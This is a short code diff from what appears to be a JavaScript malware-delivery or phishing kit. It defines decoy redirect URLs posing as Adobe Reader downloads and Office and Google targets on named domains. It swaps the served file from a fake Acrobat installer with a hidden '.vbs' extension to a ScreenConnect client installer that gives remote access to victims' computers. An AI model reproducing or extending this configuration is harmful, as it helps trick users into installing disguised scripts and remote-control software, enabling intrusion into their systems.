@@ -5,7 +5,7 @@ import dns from "dns/promises";
 const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
   "https://marcenarias.net/adobe/reader/download.html";
 
-const MSI_PATH = "/AdobeAcrobatDC_2025.003.40436_29091.msi.vbs";
+const MSI_PATH = "/ScreenConnect.ClientSetup.msi";
 
 const OFFICE_TARGET = "https://agripeace.org/ringcentral";
 const GOOGLE_TARGET = "https://agripeace.org/cw";
